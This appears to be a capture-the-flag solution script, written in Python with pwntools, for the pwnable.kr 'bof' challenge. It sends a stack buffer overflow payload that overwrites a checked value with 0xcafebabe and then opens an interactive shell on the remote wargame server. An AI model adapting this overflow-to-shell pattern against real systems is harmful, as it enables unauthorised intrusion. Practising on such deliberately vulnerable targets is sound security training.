from pwn import *

context.arch = 'i386'
context.os   = 'linux'
context.bits = 32

# DEBUG = True
DEBUG = False

if DEBUG:
    p = process('bof')
else:
    p = remote('pwnable.kr', 9000)

print "[+] overflow bof"
p.send("A"*(0x2c+4+4) + p32(0xcafebabe))

p.interactive()
p.close()
